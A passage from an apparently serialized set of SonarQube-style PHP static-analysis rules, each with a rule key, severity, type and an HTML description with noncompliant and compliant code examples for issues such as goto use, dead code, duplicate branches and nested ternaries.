as <code>if</code>, <code>for</code>, <code>while</code>, <code>continue</code> or <code>break</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$i = 0;
loop:
  echo("i = $i");
  $i++;
  if ($i &lt; 10){
    goto loop;
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++){
  echo("i = $i");
}
</pre>Z
CODE_SMELL
ƒ
php:S103∑
phpS103Lines should not be too long"MAJOR*php:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
⁄
php:S104Õ
phpS104,Files should not have too many lines of code"MAJOR*php:˘<p>A source file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to
maintain. Above a specific threshold, it is strongly advised to refactor it into smaller pieces of code which focus on well defined tasks. Those
smaller files will not only be easier to understand but also probably easier to test.</p>Z
CODE_SMELL
ì
php:S107Ü
phpS107-Functions should not have too many parameters"MAJOR*php:±<p>A long parameter list can indicate that a new structure should be created to wrap the numerous parameters or that the function is doing too many
things.</p>
<h2>Noncompliant Code Example</h2>
<p>With a maximum number of 4 parameters:</p>
<pre>
function doSomething($param1, $param2, $param3, $param4, $param5) {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething($param1, $param2, $param3, $param4) {
...
}
</pre>Z
CODE_SMELL
ÿ
php:S108À
phpS108.Nested blocks of code should not be left empty"MAJOR*php:ı<p>Most of the time a block of code is empty when a piece of code is really missing. So such empty block must be either filled or removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 42; $i++){}  // Empty on purpose or missing piece of code ?
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, this block is not considered to be empty.</p>Z
CODE_SMELL
≥

	php:S1145•

phpS1145FUseless "if(true) {...}" and "if(false){...}" blocks should be removed"MAJOR*php:Ω	<p><code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. <code>if</code>
statements with conditions that are always true are completely redundant, and make the code less readable.</p>
<p>There are three possible causes for the presence of such code: </p>
<ul>
  <li> An if statement was changed during debugging and that debug code has been committed. </li>
  <li> Some value was left unset. </li>
  <li> Some logic is not doing what the programmer thought it did. </li>
</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (true) {  // Noncompliant
  doSomething();
}
...
if (false) {  // Noncompliant
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
doSomething();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/570.html">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/571.html">MITRE, CWE-571</a> - Expression is Always True </li>
</ul>ZBUG
Ë
	php:S1144⁄
phpS1144*Unused "private" methods should be removed"MAJOR*php:á<p><code>private</code> methods that are never executed are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  private function Foo() {}   // Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.

  public static function doSomething()
  {
    $foo = new Foo();
    ...
  }

  private function unusedPrivateFunction() {  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo
{
  private function Foo(){}   // Compliant, private empty constructor intentionally used to prevent any direct instantiation of a class.

  public static function doSomething()
  {
    $foo = new Foo();
  }
}
</pre>Z
CODE_SMELL
§
	php:S1142ñ
phpS11427Functions should not contain too many return statements"MAJOR*php:∂<p>Having too many return statements in a function increases the function's essential complexity because the flow of execution is broken each time a
return statement is encountered. This makes it harder to read and understand the logic of the function.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
function myFunction(){ // Noncompliant as there are 4 return statements
  if (condition1) {
    return true;
  } else {
    if (condition2) {
      return false;
    } else {
      return true;
    }
  }
  return false;
}
</pre>Z
CODE_SMELL
’
php:S122»
phpS122&Statements should be on separate lines"MAJOR*php:˙<p>For better readability, do not put more than one statement on a single line.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if(someCondition) doSomething();
</pre>
<h2>Compliant Solution</h2>
<pre>
if(someCondition) {
  doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>Anonymous functions containing a single statement are ignored.</p>
<pre>
$max_comparator = function ($v) { return $v &gt; 2; };           // Compliant
$max_comparator = function ($v) { echo $v; return $v &gt; 2; };  // Noncompliant
</pre>Z
CODE_SMELL
˙

php:S881Ì

phpS881~Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression"MAJOR*php:«	<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
$u8a = ++$u8b + $u8c--;
$foo = $bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++$u8b;
$u8a = $u8b + $u8c;
$u8c--;
$foo = $bar / 4;
$bar++;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwE">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fYAyAQ">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/yQC7AQ">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>Z
CODE_SMELL
˝
	php:S1788Ô
phpS17883Method arguments with default values should be last"MAJOR*php:ì<p>The ability to define default values for method arguments can make a method easier to use. Default argument values allow callers to specify as many
or as few arguments as they want while getting the same functionality and minimizing boilerplate, wrapper code. </p>
<p>But all method arguments with default values should be declared after the method arguments without default values. Otherwise, it makes it
impossible for callers to take advantage of defaults; they must re-specify the defaulted values in order to "get to" the non-default arguments.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function makeyogurt($type = "acidophilus", $flavor){...}  // Noncompliant

makeyogurt("raspberry")}}  // Runtime error: Missing argument 2 in call to makeyogurt()
</pre>
<h2>Compliant Solution</h2>
<pre>
function makeyogurt($flavor, $type = "acidophilus", ){...}

makeyogurt("raspberry")}} // Works as expected
</pre>Z
CODE_SMELL
Å
	php:S2757Û
phpS2757'"=+" should not be used instead of "+=""MAJOR*php:™<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$target = -5;
$num = 3;

$target =- $num;  // Noncompliant; target = -3. Is that really what's meant?
$target =+ $num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
$target = -5;
$num = 3;

$target = -$num;  // Compliant; intent to assign inverse value of num is clear
$target += $num;
</pre>ZBUG
»
	php:S1820∫
phpS1820'Classes should not have too many fields"MAJOR*php:Í<p>A class that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain, and
having a lot of fields is an indication that a class has grown too large.</p>
<p>Above a specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well defined topics.</p>Z
CODE_SMELL
˙
	php:S2047Ï
phpS2047OThe names of methods with boolean return values should start with "is" or "has""MAJOR*php:Ù<p>Well-named functions can allow the users of your code to understand at a glance what to expect from the function - even before reading the
documentation. Toward that end, methods returning a boolean property should have names that start with "is" or "has" rather than with "get".</p>
<p>Note that this rule will only apply to functions that are documented to return a boolean.</p>
<h2>Noncompliant Code Example</h2>
<pre>
/**
 * @return boolean
 */
public function getFoo() // Noncompliant
{
  return foo;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
 * @return boolean
 */
public function isFoo()
{
  return true;
}
</pre>Z
CODE_SMELL
Î
	php:S1751›
phpS17515Loops with at most one iteration should be refactored"MAJOR*php:Ü<p>A loop with at most one iteration is equivalent to the use of an <code>if</code> statement to conditionally execute one piece of code. No developer
expects to find such a use of a loop statement. If the initial intention of the author was really to conditionally execute one piece of code, an
<code>if</code> statement should be used instead.</p>
<p>At worst that was not the initial intention of the author and so the body of the loop should be fixed to use the nested <code>return</code>,
<code>break</code> or <code>throw</code> statements in a more appropriate way.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) { // Noncompliant
  echo "i is $i";
  break;
}
...
for ($i = 0; $i &lt; 10; $i++) { // Noncompliant
  if ($i == $x) {
    break;
  } else {
    echo "i is $i";
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for ($i = 0; $i &lt; 10; $i++) {
  echo "i is $i";
}
...
for ($i = 0; $i &lt; 10; $i++) {
  if ($i == $x) {
    break;
  } else {
    echo "i is $i";
  }
}
</pre>ZBUG
ù
	php:S1871è
phpS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*php:è<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch ($i) {
  case 1:
    doFirst();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirst();
    doSomething();
    break;
  default:
    doTheRest();
}

if ($a &gt;= 0 &amp;&amp; $a &lt; 10) {
  doFirst();
  doTheThing();
}
else if ($a &gt;= 10 &amp;&amp; $a &lt; 20) {
  doTheOtherThing();
}
else if ($a &gt;= 20 &amp;&amp; $a &lt; 50) {
  doFirst();
  doTheThing();  // Noncompliant; duplicates first condition
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if ($a &gt;= 0 &amp;&amp; $a &lt; 10) {
  doTheThing();
}
else if ($a &gt;= 10 &amp;&amp; $a &lt; 20) {
  doTheOtherThing();
}
else if ($a &gt;= 20 &amp;&amp; $a &lt; 50) {
  doTheThing();  // no issue, usually this is done on purpose to increase the readability
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=php%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if ($a &gt;= 0 &amp;&amp; $a &lt; 10) {
  doTheThing();
}
else if ($a &gt;= 20 &amp;&amp; $a &lt; 50) {
  doTheThing();   //Noncompliant; this might have been done on purpose but probably not
}
</pre>Z
CODE_SMELL
–
	php:S2201¬
phpS2201GReturn values from functions without side effects should not be ignored"MAJOR*php:Ÿ<p>When the call to a function doesn't have any side effect, what is the point of making the call if the results are ignored? In such cases, either
the function call is useless and should be dropped, or the source code doesn't behave as expected. </p>
<h2>Noncompliant Code Example</h2>
<pre>
strlen($name); // Noncompliant; "strlen" has no side effect
</pre>
<h2>Compliant Solution</h2>
<pre>
$length = strlen($name);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9YIRAQ">CERT, EXP12-C.</a> - Do not ignore values returned by functions </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>ZBUG
∞
	php:S1110¢
phpS11100Redundant pairs of parentheses should be removed"MAJOR*php:…<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
$x = ($y / 2 + 1); // Compliant even if the parenthesis are ignored by the compiler

if ($a &amp;&amp; (($x + $y &gt; 0))) { // Noncompliant
  //...
}

return (($x + 1)); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
$x = ($y / 2 + 1);

if ($a &amp;&amp; ($x + $y &gt; 0)) {
  //...
}

return ($x + 1);
</pre>Z
CODE_SMELL
î
	php:S2681Ü
phpS26813Multiline blocks should be enclosed in curly braces"MAJOR*php:™<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs. </p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

if($condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally

if($condition) firstActionInBlock();  // Noncompliant
  secondAction();  // Executed unconditionally

$str = null;
for ($i = 0; $i &lt; count($array); $i++)
  $str = $array[$i];
  doTheThing($str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

if($condition) { firstActionInBlock(); secondAction(); }

if($condition) {
  firstActionInBlock();
  secondAction();
}

$str = null;
for ($i = 0; $i &lt; count($array); $i++) {
  $str = $array[$i];
  doTheThing($str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
Ø
	php:S2044°
phpS2044$"php_sapi_name()" should not be used"MAJOR*php:‘<p>Both <code>php_sapi_name()</code> and the <code>PHP_SAPI</code> constant give the same value. But calling the method is less efficient that simply
referencing the constant. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if (php_sapi_name() == 'test') { ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
if (PHP_SAPI == 'test') { ... }
</pre>Z
CODE_SMELL
ı
php:NoSonarÂ
phpNoSonar Track uses of "NOSONAR" comments"MAJOR*php:ö<p>Any issue to quality rule can be deactivated with the <code>NOSONAR</code> marker. This marker is pretty useful to exclude false-positive results
but it can also be used abusively to hide real quality flaws.</p>
<p>This rule raises an issue when <code>NOSONAR</code> is used.</p>Z
CODE_SMELL
¬
	php:S1117¥
phpS1117=Local variables should not have the same name as class fields"MAJOR*php:Œ<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class Foo {
  public $myField;

  public function doSomething() {
    $myField = 0;
    ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
Ω
	php:S1997Ø
phpS1997$Files should not contain inline HTML"MAJOR*php:‚<p>Shared coding conventions allow teams to collaborate efficiently. To avoid the confusion that can be caused by tangling two coding languages in the
same file, inline HTML should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php
$name = "George";
?&gt;
&lt;p&gt; Hello &lt;?php echo $name ?&gt;!&lt;/p&gt;
</pre>
<h2>Exceptions</h2>
<p>File having the extension <code>.phtml</code> are ignored by this rule because they are expected to have mixed PHP and HTML.</p>Z
CODE_SMELL
÷
	php:S1479»
phpS1479;"switch" statements should not have too many "case" clauses"MAJOR*php:‰<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>Z
CODE_SMELL
¥
	php:S1996¶
phpS1996?Files should contain only one top-level class or interface each"MAJOR*php:æ<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This
is doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or
interface per file.</p>Z
CODE_SMELL
Ò
	php:S2042„
phpS2042.Classes should not have too many lines of code"MAJOR*php:å<p>A class that grows too much tends to aggregate too many responsibilities, and inevitably becomes harder to understand and to maintain. Above a
specific threshold, it is strongly advised to refactor the class into smaller ones which focus on well-defined topics.</p>Z
CODE_SMELL
ƒ
	php:S1763∂
phpS1763All code should be reachable"MAJOR*php:¯<p>Some statements (<code>return</code>, <code>break</code>, <code>continue</code>, <code>goto</code>, <code>switch</code>) and <code>throw</code>
expressions move control flow out of the current code block. So any unlabeled statements that come after such a jump are unreachable, and either this
dead code should be removed, or the logic should be corrected. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun($a) {
  $i = 10;
  return $i + $a;
  $i++;             // dead code
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun($a) {
  $i = 10;
  return $i + $a;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
Û

	php:S1764Â

phpS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*php:¯	<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( $a == $a ) { // always true
  doZ();
}
if ( $a != $a ) { // always false
  doY();
}
if ( $a == $b &amp;&amp; $a == $b ) { // if the first one is true, the second one is too
  doX();
}
if ( $a == $b || $a == $b ) { // if the first one is true, the second one is too
  doW();
}

$j = 5 / 5; //always 1
$k = 5 - 5; //always 0
</pre>
<h2>Exceptions</h2>
<p>Left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.</p>
<pre>
$i = 1 &lt;&lt; 1; // Compliant
$j = $a &lt;&lt; $a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=php%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
˛	
	php:S1121	
phpS1121:Assignments should not be made from within sub-expressions"MAJOR*php:ç	<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($val = value() &amp;&amp; check()) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$val = value();
if ($val &amp;&amp; check()) {
}
</pre>
<p>or </p>
<pre>
if ($val == value() &amp;&amp; check()) { // Perhaps in fact the assignment operator was expected
}
</pre>
<h2>Exceptions</h2>
<p>Assignments in <code>while</code> statement conditions, and assignments enclosed in relational expressions are allowed.</p>
<pre>
while (($line = next_line()) != NULL) {...}

while ($line = next_line()) {...}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/nYFtAg">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1gCTAw">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>Z
CODE_SMELL
˝
	php:S1697Ô
phpS1697WShort-circuit logic should be used to prevent null pointer dereferences in conditionals"MAJOR*php:ˆ<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely
null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced
<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($obj == null &amp;&amp; $obj-&gt;isOpen()) {
  echo "Object is open";
}

if ($obj != null || $obj-&gt;isOpen()) {
  echo "Object is not open";
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($obj == null || $obj-&gt;isOpen()) {
  echo "Object is open";
}

if ($obj != null &amp;&amp; !$obj-&gt;isOpen()) {
  echo "Object is not open";
}
</pre>ZBUG
ã
	php:S3358˝
phpS3358&Ternary operators should not be nested"MAJOR*php:Æ<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function get_title($gender, $is_married) {
  return $gender == "MALE" ? "Mr. " : ($is_married ? "Mrs. " : "Miss ");  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function get_title($gender, $is_married) {
  if ($gender == "MALE") {
    return "Mr. ";
  }
  return $is_married ? "Mrs. " : "Miss ";
}
</pre>Z
CODE_SMELL
ë

	php:S1854É

phpS1854$Unused assignments should be removed"MAJOR*php:∂	<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$i = $a + $b; // Noncompliant; calculation result not used before value is overwritten
$i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
$i = $a + $b;
$i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>true</code>, <code>false</code>, <code>""</code>, <code>[]</code> and
<code>array()</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
Œ
	php:S1172¿
phpS1172,Unused function parameters should be removed"MAJOR*php:Î<p>Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething($a, $b) { // "$a" is unused
  return compute($b);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething($b) {
  return compute($b);
}
</pre>
<h2>Exceptions</h2>
<p>Functions in classes that override a class or implement interfaces are ignored.</p>
<pre>
class C extends B {

  function doSomething($a, $b) {     // no issue reported on $b
    compute($a);
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
Ø
	php:S2260°
phpS2260PHP parser failure"MAJOR*php:Ê<p>When the PHP parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number
of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
á
	php:S1862˘
phpS1862\Related "if/else if" statements and "cases" in a "switch" should not have the same condition"MAJOR*php:˚<p>A <code>switch</code> and a chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will
be executed: the first one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>For a <code>switch</code>, if the first case ends with a <code>break</code>, the second case will never be executed, rendering it dead code. Worse
there is the risk in this situation that future maintenance will be done on the dead case, rather than on the one that's actually used.</p>
<p>On the other hand, if the first case does not end with a <code>break</code>, both cases will be executed, but future maintainers may not notice
that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($param == 1)
  openWindow();
else if ($param == 2)
  closeWindow();
else if ($param == 1)  // Noncompliant
  moveWindowToTheBackground();


switch($i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  case 1:  // Noncompliant
    //...
    break;
  default:
    // ...
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if ($param == 1)
  openWindow();
else if ($param == 2)
  closeWindow();
else if ($param == 3)
  moveWindowToTheBackground();

switch($i) {
  case 1:
    //...
    break;
  case 3:
    //...
    break;
  default:
    // ...
    break;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
‹
	php:S2830Œ
phpS28302Class constructors should not create other objects"MAJOR*php:Û<p>Dependency injection is a software design pattern in which one or more dependencies (or services) are injected, or passed by reference, into a
dependent object (or client) and are made part of the client's state. The pattern separates the creation of a client's dependencies from its own
behavior, which allows program designs to be loosely coupled and to follow the dependency inversion and single responsibility principles.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class SomeClass {

  public function __construct() {
    $this-&gt;object = new SomeOtherClass();  // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class SomeClass {

  public function __construct(SomeOtherClass $object) {
    $this-&gt;object = $object;
  }
}
</pre>Z
CODE_SMELL
Ê	
	php:S2036ÿ	
phpS20367Files that define symbols should not cause side-effects"MAJOR*php:ˇ<p>Files that define symbols such as classes and variables may be included into many files. Simply performing that inclusion should have no effect on
those files other than declaring new symbols. For instance, a file containing a class definition should not also contain side-effects such as
<code>print</code> statements that will be evaluated automatically on inclusion. Logic should be segregated into symbol-only files and
side-effect-only files. The type of operation which is not allowed in a symbol-definition file includes but is not limited to: </p>
<ul>
  <li> generating output </li>
  <li> modifying <code>ini</code> settings </li>
  <li> emitting errors or exceptions </li>
  <li> modifying global or static variables </li>
  <li> reading/writing files </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;?php

print "Include worked!";

class foo {
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;?php

class foo {

  public function log() {
    print "Include worked!";
  }

}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.php-fig.org/psr/psr-1/">PHP-FIG Basic Coding Standard PSR1</a>, 2.3 - Side Effects </li>
</ul>ZBUG
˙
	php:S1068Ï
phpS1068)Unused "private" fields should be removed"MAJOR*php:ö<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private $foo = 4;                       //foo is unused

  public function compute($a) {
    return $a * 4;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  public function compute($a) {
    return $a * 4;
  }
}
</pre>Z
CODE_SMELL
˜
	php:S1066È
phpS1066,Collapsible "if" statements should be merged"MAJOR*php:î<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition1) {
  if (condition2) {
    ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2) {
  ...
}
</pre>Z
CODE_SMELL
–
	php:S3923¬
phpS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*php:…<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ($b == 0) {  // Noncompliant
  doOneMoreThing();
} else {
  doOneMoreThing();
}

$b = $a &gt; 12 ? 4 : 4;  // Noncompliant

switch ($i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if($b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} elseif($b == 1) {
  doSomething();
}
</pre>ZBUG
Ô
	php:S3801·
phpS3801*Functions should use "return" consistently"MAJOR*php:é<p>Because it is dynamically typed, PHP does not enforce a return type on a function. This means that different paths through a function can return
different types of values, which can be very confusing to the user and significantly harder to maintain.</p>
<p>In particular, it is consequently also possible to mix empty <code>return</code> statements (implicitly returning <code>null</code>) with some
returning an expression. This rule verifies that all the <code>return</code> statements from a function are consistent.</p>
